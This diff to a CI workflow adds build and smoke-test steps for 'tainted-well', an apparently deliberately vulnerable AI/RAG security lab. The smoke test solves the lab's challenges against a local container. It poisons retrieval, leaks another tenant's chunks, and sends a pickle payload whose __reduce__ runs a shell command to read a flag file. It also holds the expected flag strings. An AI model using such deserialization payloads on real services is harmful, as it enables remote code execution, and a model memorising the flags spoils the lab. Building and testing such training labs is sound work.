@@ -1,8 +1,7 @@
 # Opt-in AI track checks. This workflow does not replace generate_checksum.yml.
 #
-# ubuntu-latest is linux/amd64. The image jobs build mind-core,
-# echo-chamber, oracle-booth, and marionette for linux/amd64 and
-# linux/arm64. QEMU is
+# ubuntu-latest is linux/amd64. The image jobs build mind-core, echo-chamber,
+# oracle-booth, marionette, and tainted-well for linux/amd64 and linux/arm64. QEMU is
 # registered only for that build step so the arm64 image can be built on
 # the hosted amd64 runner.
 # The smoke test runs the native amd64 image. Booting arm64 under QEMU is
@@ -43,6 +42,10 @@ jobs:
       - name: Marionette tests
         run: python3 -m unittest test_marionette
         working-directory: agentic-ai-labs/marionette
+
+      - name: Tainted-well tests
+        run: python3 -m unittest test_tainted_well
+        working-directory: agentic-ai-labs/tainted-well
 
       - name: Compose config without a profile
         run: docker compose config -q
@@ -469,3 +472,112 @@ jobs:
       - name: Stop marionette and mind-core
         if: always()
         run: docker compose --profile ai rm -sf marionette mind-core
+
+  tainted-well-image:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Register QEMU for the arm64 build
+        uses: docker/setup-qemu-action@v3
+        with:
+          platforms: arm64
+
+      - name: Set up Buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Build tainted-well for linux/amd64 and linux/arm64
+        run: |
+          docker buildx build \
+            --platform linux/amd64,linux/arm64 \
+            --provenance=false \
+            --sbom=false \
+            --output type=oci,dest=/tmp/tainted-well.oci \
+            ./agentic-ai-labs/tainted-well
+          test -s /tmp/tainted-well.oci
+
+      - name: Start mind-core and tainted-well in deterministic mode
+        run: docker compose --profile ai up -d --build mind-core tainted-well
+
+      - name: Wait for the healthcheck and capture the flags
+        run: |
+          set -euo pipefail
+          deadline=$((SECONDS + 90))
+          status=""
+          while [ "$SECONDS" -lt "$deadline" ]; do
+            status="$(docker inspect --format '{{if .State.Health}}{{.State.Health.Status}}{{end}}' tainted-well || true)"
+            if [ "$status" = "healthy" ]; then
+              break
+            fi
+            sleep 2
+          done
+          if [ "$status" != "healthy" ]; then
+            docker logs mind-core || true
+            docker logs tainted-well || true
+            echo "tainted-well health status: ${status}" >&2
+            exit 1
+          fi
+          python3 - << 'PY'
+          import base64
+          import json
+          import pickle
+          import subprocess
+          import urllib.request
+
+          POISON = "WEBSPLOIT{P01S0N3D_R3TR13V4L_B14S}"
+          CROSS = "WEBSPLOIT{CR0SS_T3N4NT_CHUNK_L34K}"
+          ARTIFACT = "WEBSPLOIT{P1CKL3D_M0D3L_4RT1F4CT_RC3}"
+
+          class ReadFlag:
+              def __reduce__(self):
+                  return (subprocess.check_output, (["cat", "flags/model.txt"],))
+
+          def post(path, payload):
+              request = urllib.request.Request(
+                  "http://127.0.0.1:5033" + path,
+                  data=json.dumps(payload).encode("utf-8"),
+                  headers={"Content-Type": "application/json"},
+                  method="POST",
+              )
+              with urllib.request.urlopen(request, timeout=10) as response:
+                  body = json.load(response)
+                  if response.status != 200:
+                      raise SystemExit(f"{path} status {response.status}: {body}")
+                  return body
+
+          with urllib.request.urlopen("http://127.0.0.1:5033/health", timeout=5) as response:
+              body = json.load(response)
+              if response.status != 200 or body.get("status") != "ok" or body.get("ready") is not True:
+                  raise SystemExit(f"health failed: {body}")
+
+          poison = post("/search", {"tenant": "acme", "query": "password reset"})
+          if poison.get("source") != "mind-core" or poison.get("rule_id") != "tainted-well-poison":
+              raise SystemExit(f"poison rule failed: {poison}")
+          if poison.get("chunks", [{}])[0].get("id") != "poison-faq" or POISON not in poison.get("flags", []):
+              raise SystemExit(f"poisoned retrieval flag missing: {poison}")
+
+          direct = post("/search", {"tenant": "acme", "query": "promote the tainted index"})
+          if POISON in direct.get("flags", []):
+              raise SystemExit("poison flag released from the query instead of a chunk")
+
+          cross = post("/search", {"tenant": "acme", "query": "quarterly revenue"})
+          leaked = [chunk for chunk in cross.get("chunks", []) if chunk.get("tenant") == "globex"]
+          if not leaked or CROSS not in cross.get("flags", []):
+              raise SystemExit(f"cross-tenant flag missing: {cross}")
+
+          artifact = base64.b64encode(pickle.dumps(ReadFlag())).decode("ascii")
+          loaded = post("/model/load", {"artifact": artifact})
+          if loaded.get("flag") != ARTIFACT:
+              raise SystemExit(f"artifact flag missing: {loaded}")
+
+          benign = post("/model/load", {"artifact": base64.b64encode(pickle.dumps({"name": "toy"})).decode("ascii")})
+          if benign.get("flag") is not None:
+              raise SystemExit(f"benign artifact released a flag: {benign}")
+          print("tainted-well smoke ok")
+          PY
+
+      - name: Stop tainted-well and mind-core
+        if: always()
+        run: docker compose --profile ai rm -sf tainted-well mind-core
